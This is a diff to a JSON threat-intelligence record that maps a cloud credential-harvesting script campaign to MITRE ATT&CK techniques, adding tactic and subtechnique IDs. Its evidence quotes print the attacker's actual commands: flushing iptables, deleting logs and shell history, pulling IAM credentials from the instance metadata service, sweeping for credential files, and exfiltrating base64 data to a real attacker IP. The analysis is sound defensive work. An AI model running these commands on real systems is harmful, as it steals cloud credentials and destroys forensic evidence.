@@ -7,8 +7,8 @@
         {
           "technique_id": "T1190",
           "technique_name": "Exploit Public-Facing Application",
-          "inferred": true,
-          "evidence_quote": "The majority of the victim system were running public facing Jupyter Notebooks. While this campaign is ongoing...we do suspect it is likely related to exploitation of vulnerable web applications.",
+          "inferred": false,
+          "evidence_quote": "The majority of the victim system were running public facing Jupyter Notebooks...we do suspect it is likely related to exploitation of vulnerable web applications.",
           "validated": true
         }
       ]
@@ -21,8 +21,9 @@
           "technique_id": "T1059.004",
           "technique_name": "Command and Scripting Interpreter: Unix Shell",
           "inferred": false,
-          "evidence_quote": "The file aws.sh was uploaded and made accessible...aws.sh is a utility that is meant to harvest credentials from AWS EC2 instances",
-          "validated": false
+          "evidence_quote": "The file aws.sh was uploaded and made accessible at the path: http://45.9.148.221/sh/get/aws.sh. aws.sh is a utility that is meant to harvest credentials from AWS EC2 instances",
+          "validated": false,
+          "subtechnique_id": "T1059.004"
         }
       ]
     },
@@ -31,25 +32,28 @@
       "tactic_name": "Defense Evasion",
       "techniques": [
         {
+          "technique_id": "T1562.004",
+          "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+          "inferred": false,
+          "evidence_quote": "iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null\niptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -F 2>/dev/null 1>/dev/null",
+          "validated": false,
+          "subtechnique_id": "T1562.004"
+        },
+        {
           "technique_id": "T1070.002",
           "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
           "inferred": false,
-          "evidence_quote": "rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null\nrm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null\nlastlog --clear --user root",
-          "validated": false
+          "evidence_quote": "rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null\nrm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null\nlastlog --clear --user root 2>/dev/null 1>/dev/null",
+          "validated": false,
+          "subtechnique_id": "T1070.002"
         },
         {
           "technique_id": "T1070.003",
           "technique_name": "Indicator Removal: Clear Command History",
           "inferred": false,
           "evidence_quote": "rm -f ~/.bash_history 2>/dev/null 1>/dev/null\ntouch ~/.bash_history 2>/dev/null 1>/dev/null\nchattr +i ~/.bash_history 2>/dev/null 1>/dev/null\nhistory -cw",
-          "validated": false
-        },
-        {
-          "technique_id": "T1562.004",
-          "technique_name": "Impair Defenses: Disable or Modify System Firewall",
-          "inferred": false,
-          "evidence_quote": "iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null\niptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -F 2>/dev/null 1>/dev/null",
-          "validated": false
+          "validated": false,
+          "subtechnique_id": "T1070.003"
         }
       ]
     },
@@ -59,31 +63,27 @@
       "techniques": [
         {
           "technique_id": "T1552.005",
-          "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+          "technique_name": "Cloud Instance Metadata API",
           "inferred": false,
-          "evidence_quote": "AWS_INFO=$(dload http://169.254.169.254/latest/meta-data/iam/info | tr '\\0' '\\n')\nAWS_1_EC2=$(dload http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\\0' '\\n')",
-          "validated": true
-        },
-        {
-          "technique_id": "T1552.001",
-          "technique_name": "Unsecured Credentials: Credentials In Files",
-          "inferred": false,
-          "evidence_quote": "find / -maxdepth 23 -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS",
-          "validated": true
+          "evidence_quote": "AWS_1_EC2=$(dload http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\\0' '\\n')\nAWS_1_IAM_NAME=$(dload http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
+          "validated": true,
+          "subtechnique_id": "T1552.005"
         },
         {
           "technique_id": "T1552.007",
-          "technique_name": "Unsecured Credentials: Container API",
+          "technique_name": "Container API",
           "inferred": false,
           "evidence_quote": "dload http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | sed 's/,/\\n/g' | grep 'AccessKeyId\\|SecretAccessKey\\|Token\\|Expiration'",
-          "validated": true
+          "validated": true,
+          "subtechnique_id": "T1552.007"
         },
         {
-          "technique_id": "T1552.004",
-          "technique_name": "Unsecured Credentials: Private Keys",
-          "inferred": true,
-          "evidence_quote": "CRED_FILE_NAMES=(\"credentials\" \".s3cfg\" \".passwd-s3fs\" \"authinfo2\" ... \"secrets\" \".boto\" \".netrc\" \".git-credentials\")",
-          "validated": false
+          "technique_id": "T1552.001",
+          "technique_name": "Credentials In Files",
+          "inferred": false,
+          "evidence_quote": "find / -maxdepth 23 -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS",
+          "validated": true,
+          "subtechnique_id": "T1552.001"
         }
       ]
     },
@@ -119,19 +119,6 @@
           "validated": false
         }
       ]
-    },
-    {
-      "tactic_id": "TA0011",
-      "tactic_name": "Command and Control",
-      "techniques": [
-        {
-          "technique_id": "T1071.001",
-          "technique_name": "Application Layer Protocol: Web Protocols",
-          "inferred": false,
-          "evidence_quote": "harvested credentials are uploaded to an open HTTP directory http://45.9.148.221/<redacted>/",
-          "validated": false
-        }
-      ]
     }
   ],
   "attack_chain": [
@@ -147,7 +134,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0001"
     },
     {
       "step": 2,
@@ -161,7 +149,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0002"
     },
     {
       "step": 3,
@@ -175,7 +164,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0005"
     },
     {
       "step": 4,
@@ -190,7 +180,8 @@
         "EC2",
         "IAM"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0007"
     },
     {
       "step": 5,
@@ -204,7 +195,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0007"
     },
     {
       "step": 6,
@@ -219,7 +211,8 @@
         "EC2",
         "IAM"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0006"
     },
     {
       "step": 7,
@@ -233,7 +226,8 @@
       "aws_services_involved": [
         "ECS"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0006"
     },
     {
       "step": 8,
@@ -247,7 +241,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0006"
     },
     {
       "step": 9,
@@ -261,7 +256,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0005"
     },
     {
       "step": 10,
@@ -275,7 +271,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0005"
     },
     {
       "step": 11,
@@ -289,7 +286,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0010"
     }
   ],
   "aws_services": [
@@ -324,7 +322,7 @@
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Unix Shell",
         "description": "Attacker downloaded and executed aws.sh, a Bash credential harvesting script, on compromised systems.",
-        "tactic_id": "",
+        "tactic_id": "TA0002",
         "evidence_quote": "The file aws.sh was uploaded and made accessible at the path: http://45.9.148.221/sh/get/aws.sh. aws.sh is a utility that is meant to harvest credentials from AWS EC2 instances",
         "evidence_sources": [
           "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
@@ -338,7 +336,7 @@
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "description": "The script flushed all iptables rules and set default policies to ACCEPT, disabling host-based firewall protections.",
-        "tactic_id": "",
+        "tactic_id": "TA0005",
         "evidence_quote": "iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null\niptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null\niptables -F 2>/dev/null 1>/dev/null",
         "evidence_sources": [
           "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
@@ -424,7 +422,7 @@
         "technique_id": "T1070.002",
         "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
         "description": "The script cleared syslog, auth.log, wtmp, btmp, lastlog, and ran lastlog --clear to remove forensic evidence of the intrusion.",
-        "tactic_id": "",
+        "tactic_id": "TA0005",
         "evidence_quote": "rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null\nrm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null\nlastlog --clear --user root 2>/dev/null 1>/dev/null",
         "evidence_sources": [
           "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
@@ -438,7 +436,7 @@
         "technique_id": "T1070.003",
         "technique_name": "Indicator Removal: Clear Command History",
         "description": "The script deleted and immutably locked bash_history and cleared in-memory command history to prevent forensic recovery.",
-        "tactic_id": "",
+        "tactic_id": "TA0005",
         "evidence_quote": "rm -f ~/.bash_history 2>/dev/null 1>/dev/null\ntouch ~/.bash_history 2>/dev/null 1>/dev/null\nchattr +i ~/.bash_history 2>/dev/null 1>/dev/null\nhistory -cw",
         "evidence_sources": [
           "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
@@ -452,7 +450,7 @@
         "technique_id": "T1041",
         "technique_name": "Exfiltration Over C2 Channel",
         "description": "Harvested credentials were base64-encoded and exfiltrated to the attacker's C2 server via an HTTP GET request to a PHP ingestion endpoint.",
-        "tactic_id": "",
+        "tactic_id": "TA0010",
         "evidence_quote": "SEND_B64_DATA=$(cat $CSOF | base64 -w 0)\nrm -f $CSOF\ndload http://45.9.148.221/in/in.php?base64=$SEND_B64_DATA > /dev/null",
         "evidence_sources": [
           "https://permiso.io/blog/s/christmas-cloud-cred-harvesting-campaign/"
